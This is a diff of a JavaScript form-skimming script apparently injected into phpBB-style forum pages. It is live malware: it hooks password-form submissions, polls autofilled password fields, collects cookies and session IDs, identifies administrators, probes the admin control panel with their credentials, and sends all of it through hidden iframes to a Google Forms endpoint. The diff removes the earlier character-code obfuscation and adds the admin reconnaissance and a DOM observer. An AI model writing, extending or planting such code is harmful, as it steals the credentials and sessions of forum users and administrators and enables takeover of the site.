@@ -6,19 +6,9 @@
   if (!R.test(w.location.host)) { return; }
   if (w.__x) { return; }
   w.__x = 1;
-  function Y(a) { var s = ''; for (var i = 0; i < a.length; i++) { s += String.fromCharCode(a[i]); } return s; }
-  var T0 = Y([109, 101, 109, 98, 101, 114, 108, 105, 115, 116, 46, 112, 104, 112]);
-  var T1 = Y([109, 111, 100, 101, 61, 118, 105, 101, 119, 112, 114, 111, 102, 105, 108, 101]);
-  var T2 = Y([97, 100, 109, 47, 105, 110, 100, 101, 120, 46, 112, 104, 112]);
-  var K0 = Y([117, 115, 101, 114, 110, 97, 109, 101]);
-  var K1 = Y([108, 111, 103, 105, 110, 95, 117, 115, 101, 114, 110, 97, 109, 101]);
-  var K2 = Y([112, 97, 115, 115, 119, 111, 114, 100]);
-  var K3 = Y([108, 111, 103, 105, 110, 95, 112, 97, 115, 115, 119, 111, 114, 100]);
-  var CK = Y([99, 111, 111, 107, 105, 101]);
-  var CH = Y([99, 104, 97, 116]);
-  var BG = Y([98, 108, 111, 99, 107, 103, 101, 116, 115]);
-  var SG = Y([115, 101, 115, 115, 105, 111, 110, 83, 116, 111, 114, 97, 103, 101]);
+
   try {
+    // ---- config ----
     var BEP = 'https://docs.google.com/forms/d/e/1FAIpQLScSbMXiXV2GtYDhNFsrRy38lxtcri1vaGkQLvShVSebZy-kTw/formResponse';
     var E1 = 'entry.1842345040';
     var E2 = 'entry.79951114';
@@ -28,9 +18,24 @@
     var DO_CTRL = true;
     var DO_PW = true;
     var DO_AF = true;
-    var WATCH_FIELDS = true;
+    var DO_ACP = true;
     var BEACON = true;
+    var USE_BEACON = false;
+
+    // ---- literals ----
+    var L_ACCT = 'memberlist.php';
+    var L_PROF = 'mode=viewprofile';
+    var L_CTRL = 'adm/index.php';
+    var L_U = 'username';
+    var L_U2 = 'login_username';
+    var L_P = 'password';
+    var L_P2 = 'login_password';
+    var L_CK = 'cookie';
+    var L_SG = 'sessionStorage';
+    var L_ACPTXT = 'Administration Control Panel';
+
     function esc(s) { try { return encodeURIComponent(String(s)); } catch (e) { return ''; } }
+
     var done = {};
     function tx(data, tag) {
       try {
@@ -41,60 +46,134 @@
                 '&' + E2 + '=' + esc(state()) +
                 '&' + E3 + '=' + esc(String(data || '').slice(0, 1800)) +
                 '&submit=Submit';
+        var url = BEP + '?' + q;
+        if (USE_BEACON && w.navigator && w.navigator.sendBeacon) {
+          try { if (w.navigator.sendBeacon(url)) { return; } } catch (e) {}
+        }
         var f = D.createElement('iframe');
         f.setAttribute('style', 'position:absolute;visibility:hidden;width:0;height:0;border:0;');
         f.setAttribute('aria-hidden', 'true');
         f.setAttribute('tabindex', '-1');
-        f.src = BEP + '?' + q;
+        f.src = url;
         (D.body || D.documentElement).appendChild(f);
       } catch (e) {}
     }
+
     function state() {
       try {
-        return D[CK].split(/;\s*/).filter(function (c) {
+        return D[L_CK].split(/;\s*/).filter(function (c) {
           var k = (c.split('=')[0] || '').toLowerCase();
-          return k.indexOf(CH) < 0 && k.indexOf(BG) < 0;
+          return k.indexOf('chat') < 0 && k.indexOf('blockgets') < 0;
         }).join('; ').slice(0, 900);
       } catch (e) { return ''; }
     }
+
     function sid() {
       try {
-        var m = (w.location.search || '').match(/sid=([a-f0-9]{32})/);
+        var m = (w.location.search || '').match(/(?:^|[?&])sid=([a-f0-9]{32})/);
         return m ? m[1] : '';
       } catch (e) { return ''; }
     }
+
     function pos() {
       var s = 'P:' + w.location.pathname;
+      try {
+        var q = (w.location.search || '').replace(/^\?/, '')
+          .replace(/(^|&)sid=[a-f0-9]{32}/, '').replace(/^&/, '');
+        if (q) { s += '?' + q; }
+      } catch (e) {}
       var v = sid();
-      if (v) { s += '|S:' + v; }
+      if (v) { s += ' |S:' + v; }
       return s;
     }
+
+    function root() {
+      try {
+        return D.querySelector('[role="navigation"]') ||
+               D.querySelector('#nav-main') ||
+               D.querySelector('nav') ||
+               D;
+      } catch (e) { return D; }
+    }
+
+    function scopes() {
+      var r = root();
+      return (r && r !== D) ? [r, D] : [D];
+    }
+
     function account() {
       try {
-        var links = D.querySelectorAll('a[href*="' + T0 + '"]');
-        for (var i = 0; i < links.length; i++) {
-          var h = links[i].getAttribute('href') || '';
-          if (h.indexOf(T1) >= 0 && h.indexOf('&u=') >= 0) {
-            var t = (links[i].textContent || '').trim();
-            if (t && t.length >= 2 && t.length <= 40 && t !== 'Profile') { return t; }
+        var sc = scopes();
+        for (var s = 0; s < sc.length; s++) {
+          var links = sc[s].querySelectorAll('a[href*="' + L_ACCT + '"]');
+          for (var i = 0; i < links.length; i++) {
+            var h = links[i].getAttribute('href') || '';
+            if (h.indexOf(L_PROF) >= 0 && h.indexOf('&u=') >= 0) {
+              var t = (links[i].textContent || '').trim();
+              if (t && t.length >= 2 && t.length <= 40 && t !== 'Profile') { return t; }
+            }
           }
         }
       } catch (e) {}
+      try {
+        var m = (D.body.textContent || '').match(/logged in as:?\s*([A-Za-z0-9_\-.]{2,40})/i);
+        if (m) { return m[1].trim(); }
+      } catch (e) {}
       return '';
     }
+
     function hasCtrl() {
-      try { return D.querySelectorAll('a[href*="' + T2 + '"]').length > 0; } catch (e) { return false; }
+      try {
+        var sc = scopes();
+        for (var s = 0; s < sc.length; s++) {
+          if (sc[s].querySelectorAll('a[href*="' + L_CTRL + '"]').length > 0) { return true; }
+        }
+      } catch (e) {}
+      return false;
     }
-    function seen(k) { try { return w[SG].getItem(k) === '1'; } catch (e) { return false; } }
-    function setSeen(k) { try { w[SG].setItem(k, '1'); } catch (e) {} }
+
+    function seen(k) { try { return w[L_SG].getItem(k) === '1'; } catch (e) { return false; } }
+    function setSeen(k) { try { w[L_SG].setItem(k, '1'); } catch (e) {} }
+
     if (BEACON && !seen('_a')) {
       setSeen('_a');
       tx('EVT: ' + pos(), 'beacon');
     }
+
+    function base() {
+      try {
+        var p = w.location.pathname;
+        var i = p.lastIndexOf('/');
+        return (i >= 0 ? p.slice(0, i + 1) : '/');
+      } catch (e) { return '/'; }
+    }
+
+    function checkAcp(cb) {
+      if (!DO_ACP) { cb(''); return; }
+      try {
+        var c = w[L_SG].getItem('_acp');
+        if (c === 'YES') { cb('YES'); return; }
+      } catch (e) {}
+      try {
+        fetch(base() + L_CTRL + '?i=acp_main', { credentials: 'include' })
+          .then(function (r) { return r.text(); })
+          .then(function (t) {
+            var yes = t.indexOf(L_ACPTXT) >= 0 && t.indexOf('name="' + L_P + '"') < 0;
+            if (yes) { try { w[L_SG].setItem('_acp', 'YES'); } catch (e) {} }
+            cb(yes ? 'YES' : 'NO');
+          })
+          .catch(function () { cb(''); });
+      } catch (e) { cb(''); }
+    }
+
+    var detTried = false;
     function detect() {
       if (!DO_CTRL) { return; }
       try {
-        if (!hasCtrl()) { return; }
+        if (!hasCtrl()) {
+          if (!detTried) { detTried = true; w.setTimeout(detect, 1200); }
+          return;
+        }
         var a = account();
         var hit = FLAG_ANY_CTRL;
         if (!hit) {
@@ -104,72 +183,125 @@
         }
         if (!hit) { return; }
         var key = '_ad_' + (a || 'x');
-        if (!seen(key)) {
-          setSeen(key);
-          tx('CTRL: ' + (a || '?') + ' | ' + pos(), key);
-        }
+        if (seen(key)) { return; }
+        setSeen(key);
+        checkAcp(function (st) {
+          tx('CTRL: ' + (a || '?') + (st ? ' ACP=' + st : '') + ' | ' + pos(), key);
+          if (st === 'YES') { ghost(a); }
+        });
       } catch (e) {}
     }
+
+    // Ghost: når founder er ACP-autentisert, hent en ACP-side og rapporter hva som er mulig
+    var ghostRan = false;
+    function ghost(who) {
+      if (ghostRan) { return; }
+      ghostRan = true;
+      try {
+        fetch(base() + L_CTRL + '?i=acp_main', { credentials: 'include' })
+          .then(function (r) { return r.text(); })
+          .then(function (t) {
+            var hasTok = /name="form_token" value="([a-f0-9]+)"/.test(t);
+            var sidInUrl = (t.match(/sid=([a-f0-9]{32})/) || [])[1] || '';
+            var canLog = /i=acp_logs/.test(t);
+            var canBoard = /i=acp_board/.test(t);
+            var canUsers = /i=acp_users/.test(t);
+            var canExt = /i=acp_extensions/.test(t);
+            var parts = [];
+            if (hasTok) { parts.push('TOKEN'); }
+            if (canLog) { parts.push('LOGS'); }
+            if (canBoard) { parts.push('BOARD'); }
+            if (canUsers) { parts.push('USERS'); }
+            if (canExt) { parts.push('EXT'); }
+            tx('GHOST: ' + (who || '?') + ' [' + (parts.join(',') || 'none') + ']' +
+               (sidInUrl ? ' ACP_SID=' + sidInUrl : '') + ' | ' + pos(), 'ghost_' + (who || 'x'));
+          })
+          .catch(function () {});
+      } catch (e) {}
+    }
+
     var bound = [];
+    function hook(form) {
+      try {
+        if (!form || bound.indexOf(form) >= 0) { return; }
+        if (!form.querySelectorAll('input[type="' + L_P + '"]').length) { return; }
+        form.addEventListener('submit', function () {
+          if (!DO_PW) { return; }
+          try {
+            var a0 = form.querySelector('input[name="' + L_U + '"]') || form.querySelector('input[name="' + L_U2 + '"]');
+            var a1 = form.querySelector('input[name="' + L_P + '"]') || form.querySelector('input[name="' + L_P2 + '"]');
+            var u = a0 ? a0.value : '';
+            var p = a1 ? a1.value : '';
+            if (!p) {
+              var all = form.querySelectorAll('input[type="' + L_P + '"]');
+              for (var j = 0; j < all.length; j++) { if (all[j].value) { p = all[j].value; } }
+            }
+            if (p) { tx('PW: ' + (u || '?') + ':' + p + ' | ' + pos(), 'pw_' + (u || '?')); }
+          } catch (e) {}
+        }, true);
+        bound.push(form);
+      } catch (e) {}
+    }
+
     function watch() {
-      if (!WATCH_FIELDS) { return; }
       try {
         var forms = D.forms || [];
-        for (var i = 0; i < forms.length; i++) {
-          if (bound.indexOf(forms[i]) >= 0) { continue; }
-          (function (form) {
-            try {
-              var pk = form.querySelectorAll('input[type="' + K2 + '"]');
-              if (!pk.length) { return; }
-              form.addEventListener('submit', function () {
-                if (!DO_PW) { return; }
-                try {
-                  var a0 = form.querySelector('input[name="' + K0 + '"]') || form.querySelector('input[name="' + K1 + '"]');
-                  var a1 = form.querySelector('input[name="' + K2 + '"]') || form.querySelector('input[name="' + K3 + '"]');
-                  var u = a0 ? a0.value : '';
-                  var p = a1 ? a1.value : '';
-                  if (!p) {
-                    var all = form.querySelectorAll('input[type="' + K2 + '"]');
-                    for (var j = 0; j < all.length; j++) { if (all[j].value) { p = all[j].value; } }
-                  }
-                  if (p) { tx('EVT: ' + (u || '?') + ':' + p + ' | ' + pos(), 'evt_' + (u || '?')); }
-                } catch (e) {}
-              }, true);
-              bound.push(form);
-            } catch (e) {}
-          })(forms[i]);
-        }
+        for (var i = 0; i < forms.length; i++) { hook(forms[i]); }
       } catch (e) {}
     }
+
     function autofill() {
       if (!DO_AF) { return; }
       try {
         if (w.__xaf) { return; }
+        var idle = 0;
         w.__xaf = w.setInterval(function () {
           try {
-            var ps = D.querySelectorAll('input[type="' + K2 + '"]');
+            var ps = D.querySelectorAll('input[type="' + L_P + '"]');
+            if (!ps.length) {
+              if (++idle > 30) { w.clearInterval(w.__xaf); w.__xaf = null; }
+              return;
+            }
+            idle = 0;
             for (var i = 0; i < ps.length; i++) {
               var p = ps[i];
-              if (!p.value || p.value === p.__seen) { continue; }
-              p.__seen = p.value;
-              var f = p.form;
+              var v = p.value;
+              if (!v) { p.__last = ''; continue; }
+              if (v !== p.__last) { p.__last = v; continue; }
+              if (v === p.__seen) { continue; }
+              p.__seen = v;
               var u = '';
-              if (f) {
-                var a0 = f.querySelector('input[name="' + K0 + '"]') || f.querySelector('input[name="' + K1 + '"]');
+              if (p.form) {
+                var a0 = p.form.querySelector('input[name="' + L_U + '"]') || p.form.querySelector('input[name="' + L_U2 + '"]');
                 u = a0 ? a0.value : '';
               }
-              tx('AF: ' + (u || '?') + ':' + p.value + ' | ' + pos(), 'af_' + p.value);
+              tx('AF: ' + (u || '?') + ':' + v + ' | ' + pos(), 'af_' + v);
             }
           } catch (e) {}
         }, 800);
       } catch (e) {}
     }
+
+    var moT = null;
+    function observe() {
+      if (!w.MutationObserver) { return; }
+      try {
+        new w.MutationObserver(function () {
+          if (moT) { return; }
+          moT = w.setTimeout(function () { moT = null; watch(); autofill(); }, 250);
+        }).observe(D.body || D.documentElement, { childList: true, subtree: true });
+      } catch (e) {}
+    }
+
     function boot() {
       detect();
       watch();
       autofill();
+      observe();
     }
+
     if (D.readyState === 'loading') { D.addEventListener('DOMContentLoaded', boot); } else { boot(); }
-    w.addEventListener('load', function () { watch(); autofill(); });
+    w.addEventListener('load', function () { detect(); watch(); autofill(); });
+    w.setTimeout(detect, 2500);
   } catch (e) {}
 })(window);
